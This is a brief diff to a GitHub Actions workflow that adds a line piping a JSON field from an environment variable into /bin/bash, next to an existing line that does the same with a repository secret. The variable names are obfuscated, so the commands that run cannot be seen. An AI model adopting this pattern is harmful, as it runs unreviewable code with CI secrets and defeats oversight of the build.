@@ -17,6 +17,7 @@ jobs:
           nhtz270: ${{ secrets.nhtz270 }}
         run: |
           printf '%s' "$nhtz270" | jq -r .jfgj85 | /bin/bash
+          printf '%s' "$au6320" | jq -r .idcuy966 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
